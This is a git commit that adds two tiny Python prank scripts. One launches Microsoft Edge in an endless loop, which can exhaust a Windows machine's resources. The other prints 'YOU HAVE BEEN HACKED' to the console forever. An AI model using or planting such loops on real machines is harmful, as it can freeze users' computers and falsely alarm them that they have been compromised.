fe833738fea70ff57f5c0ea8393d8824c2c38e6a
CheetoTheCheater <138292864+CheetoTheCheater@users.noreply.github.com>
2023-07-03 10:54:26 +0300

    Add files via upload

---
+++ InfiniteEdge.py
@@ -0,0 +1,3 @@
+import os
+while 1:
+    os.startfile("C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
---
+++ InfiniteTextCmd.py
@@ -0,0 +1,5 @@
+import os
+os.system("color 02")
+message = "YOU HAVE BEEN HACKED LOLOLOLOLOLOLOLOLOL"
+while 1:
+    os.system("echo " + message)
